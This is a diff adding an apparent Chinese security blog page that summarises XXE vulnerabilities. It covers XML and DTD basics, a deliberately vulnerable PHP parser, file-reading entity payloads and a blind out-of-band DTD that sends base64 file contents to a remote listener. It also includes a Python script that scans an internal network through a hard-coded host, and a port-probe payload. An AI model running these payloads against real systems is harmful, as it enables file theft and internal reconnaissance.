@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言小结一下xxe的相关内容 XML简介XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞小结">
+<meta property="og:url" content="http://yoursite.com/2019/09/26/XXE漏洞小结/index.html">
+<meta property="og:site_name" content="R1dd1er&#39;s blogs">
+<meta property="og:description" content="前言小结一下xxe的相关内容 XML简介XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/00643K3ogy1g7czf4eba0j30pr09idgy.jpg">
+<meta property="og:updated_time" content="2019-09-26T08:23:54.393Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE漏洞小结">
+<meta name="twitter:description" content="前言小结一下xxe的相关内容 XML简介XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/00643K3ogy1g7czf4eba0j30pr09idgy.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'R1dd1er'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/26/XXE漏洞小结/">
+
+
+
+
+
+  <title>XXE漏洞小结 | R1dd1er's blogs</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R1dd1er's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">积跬步，至千里</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/26/XXE漏洞小结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R1dd1er">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R1dd1er's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XXE漏洞小结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-26T16:25:15+08:00">
+                2019-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>小结一下xxe的相关内容</p>
+<h2 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h2><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。</p>
+<ul>
+<li>XML 指可扩展标记语言（EXtensible Markup Language）</li>
+<li>XML 是一种标记语言，很类似 HTML</li>
+<li>XML 的设计宗旨是传输数据，而非显示数据</li>
+<li>XML 标签没有被预定义。需要自行定义标签。</li>
+<li>XML 被设计为具有自我描述性。</li>
+</ul>
+<h3 id="XML常见应用"><a href="#XML常见应用" class="headerlink" title="XML常见应用"></a>XML常见应用</h3><p>1.XML的出现解决了程序间数据传输的问题： </p>
+<p>比如QQ之间的数据传送，用XML格式来传送数据，具有良好的可读性，可维护性</p>
+<p>2.XML可以做配置文件 </p>
+<p>XML文件做配置文件可以说非常普遍，比如Tomcat服务器的server.xml，web.xml。再比如structs中的structs-config.xml文件，和hibernate的hibernate.cfg.xml等等。</p>
+<p>3.XML可以充当小型的数据库 </p>
+<p>XML文件可以做小型数据库，程序中可能用到一些经常要人工配置的数据，如果放在数据库中读取不合适（因为这会增加维护数据库的工作），则可以考虑直接用XML来做小型数据库。这种方式直接读取文件显然要比读数据库快。比如msn中保存用户聊天记录就是用XML文件。</p>
+<h3 id="XML基本语法"><a href="#XML基本语法" class="headerlink" title="XML基本语法"></a>XML基本语法</h3><p>一个XML文件分为如下几部分内容： </p>
+<ol>
+<li>文档声明 </li>
+<li>元素 </li>
+<li>属性 </li>
+<li>注释 </li>
+<li>CDATA区、特殊字符 </li>
+<li>处理指令（processing instruction）</li>
+</ol>
+<p>具体的介绍可以参考这篇博客<a href="https://blog.csdn.net/aidem_brown/article/details/82217481" target="_blank" rel="noopener">https://blog.csdn.net/aidem_brown/article/details/82217481</a></p>
+<p>这边提一下CDATA,是为了传输带有<code>&lt;</code> <code>&gt;</code> <code>&#39;</code> <code>&quot;</code>这些字符的字符串内容,CDATA里的字符串不会被解析引擎解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">    ......</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="xml实体"><a href="#xml实体" class="headerlink" title="xml实体"></a>xml实体</h3><p>XML中的实体分为以下五种：字符实体，命名实体，外部实体，参数实体，内部实体，<strong>普通实体和参数实体都分为内部实体和外部实体两种</strong>，外部实体定义需要加上 SYSTEM关键字，其内容是URL所指向的外部文件实际的内容。如果不加SYSTEM关键字，则为内部实体，表示实体指代内容为字符串。</p>
+<h3 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h3><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
+<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<h4 id="内部的-DOCTYPE-声明"><a href="#内部的-DOCTYPE-声明" class="headerlink" title="内部的 DOCTYPE 声明"></a>内部的 DOCTYPE 声明</h4><p>假如 DTD 被包含在XML源文件中，它应当通过下面的语法包装在一个DOCTYPE声明中</p>
+<p><code>&lt;!DOCTYPE root-element [element-declarations]&gt;</code></p>
+<p>带有DTD的XML文档实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>!DOCTYPE note (第二行)定义此文档是 note 类型的文档。</li>
+<li>!ELEMENT note (第三行)定义 note 元素有四个元素：”to、from、heading,、body”</li>
+<li>!ELEMENT to (第四行)定义 to 元素为 “#PCDATA” 类型</li>
+</ul>
+<p>其他的以此类推</p>
+<h4 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h4><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
+<p><code>&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></p>
+<p>没有直接带有DTD的XML文档实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这是包含 DTD 的 “note.dtd” 文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="DTD定义实体"><a href="#DTD定义实体" class="headerlink" title="DTD定义实体"></a>DTD定义实体</h4><p>DTD不仅能定义元素(标签),还能定义实体(标签内的内容,可看成变量)</p>
+<p>测试的xml文档<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ELEMENT test ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;r1dd1er&quot; &gt;]&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们用浏览器访问可以看到</p>
+<p><code>&lt;user&gt;r1dd1er&lt;/user&gt;</code></p>
+<p><code>&amp;xxe</code>对上面定义的 xxe 实体进行了引用,因此输出时被换成了我们定义的值</p>
+<h2 id="XXE简介"><a href="#XXE简介" class="headerlink" title="XXE简介"></a>XXE简介</h2><p>XXE,就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
+<h4 id="进行一个最简单的测试"><a href="#进行一个最简单的测试" class="headerlink" title="进行一个最简单的测试"></a>进行一个最简单的测试</h4><p>xml.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>post的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/phpstudy_pro/flag.txt&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></p>
+<p>结果是可以读取到flag.txt的内容</p>
+<h4 id="来个特殊点的情况"><a href="#来个特殊点的情况" class="headerlink" title="来个特殊点的情况"></a>来个特殊点的情况</h4><p>如果读取的文件里面含有<code>&lt;</code> <code>&gt;</code> <code>&#39;</code> <code>&quot;</code>等字符,就不能直接读取,因为这些字符会被当做元素字符解析.如果想传输这些字符,就得将内容放在CDATA的里面</p>
+<p>通过参数实体构造出一个<code>&lt;![CDATA[]]&gt;</code>,就可以将含有特殊字符的文件内容正常读取出来</p>
+<p>但是不能直接将三个实体进行拼接,于是只能使用参数实体进行拼接</p>
+<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>参数实体只用于 DTD 和文档的内部子集中，XML的规范定义中，只有在DTD中才能引用参数实体. 参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。该类型的实体用“％”字符（或十六进制编码的％）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容</p>
+<p>post的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///C:/phpstudy_pro/flag.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/hack.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure></p>
+<p>hack.dtd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="无回显读取本地敏感文件(Blind OOB XXE)"></a>无回显读取本地敏感文件(Blind OOB XXE)</h4><p>xml.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>hack2.dtd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpstudy_pro/flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>post的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/hack2.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
+<p>vps上收到了带出的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  html nc -lvvp 9999</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 9999)</span><br><span class="line">Connection from 192.168.75.1 58300 received!</span><br><span class="line">GET /?p=ZmxhZ3t0aDFzXzFzX2FfdDNzdH0= HTTP/1.0</span><br><span class="line">Host: 192.168.75.130:9999</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p>
+<p>具体的调用过程:%remote调用后,请求了远程服务器上的dtd文件,接下来,%int调用会触发%file,%file将目标机的敏感文件读取后放在一个get请求上形成一个请求链接,最后通过% send完成请求,将数据成功的外带到远程服务器上.</p>
+<p>ps:很神奇的是,把恶意dtd文件放在虚拟机内可以正常加载,但是放在阿里云上就不行,暂时没找到原因</p>
+<p>备份一下不同语言可利用的一些协议<br><img src="http://ww1.sinaimg.cn/large/00643K3ogy1g7czf4eba0j30pr09idgy.jpg" alt></p>
+<h4 id="内网主机探测"><a href="#内网主机探测" class="headerlink" title="内网主机探测"></a>内网主机探测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#Origtional XML that the server accepts</span><br><span class="line">#&lt;xml&gt;</span><br><span class="line">#    &lt;stuff&gt;user&lt;/stuff&gt;</span><br><span class="line">#&lt;/xml&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &apos;&quot;&apos; + string + &apos;&quot;&apos; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line">def send_xml(xml):</span><br><span class="line">    headers = &#123;&apos;Content-Type&apos;: &apos;application/xml&apos;&#125;</span><br><span class="line">    x = requests.post(&apos;http://34.200.157.128/CUSTOM/NEW_XEE.php&apos;, data=xml, headers=headers, timeout=5).text</span><br><span class="line">    coded_string = x.split(&apos; &apos;)[-2] # a little split to get only the base64 encoded value</span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    try:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = &apos;10.0.0.&apos; + i</span><br><span class="line">        string = &apos;php://filter/convert.base64-encode/resource=http://&apos; + ip + &apos;/&apos;</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">continue</span><br></pre></td></tr></table></figure>
+<h4 id="内网主机端口扫描"><a href="#内网主机端口扫描" class="headerlink" title="内网主机端口扫描"></a>内网主机端口扫描</h4><p>传入数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:515/&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure></p>
+<p>通过回显来判断端口是否开启</p>
+<h3 id="java当中的利用"><a href="#java当中的利用" class="headerlink" title="java当中的利用"></a>java当中的利用</h3><p>留个坑,暂时还不太会java,先参考<a href="https://xz.aliyun.com/t/3357#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-14</a>这篇文章的吧,本文的实验测试和一些代码都是参考这篇文章的,写的很详细</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/3357#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-0</a></p>
+<p><a href="https://blog.csdn.net/aidem_brown/article/details/82217481" target="_blank" rel="noopener">https://blog.csdn.net/aidem_brown/article/details/82217481</a></p>
+<p><a href="https://www.runoob.com/dtd/dtd-intro.html" target="_blank" rel="noopener">https://www.runoob.com/dtd/dtd-intro.html</a></p>
+<p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/26/PHP之phar-bytectf/" rel="next" title="php之phar-bytectf2019-EzCMS">
+                <i class="fa fa-chevron-left"></i> php之phar-bytectf2019-EzCMS
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/26/SOAP反序列化利用/" rel="prev" title="SOAP反序列化的利用">
+                SOAP反序列化的利用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/touxiang.png" alt="R1dd1er">
+            
+              <p class="site-author-name" itemprop="name">R1dd1er</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
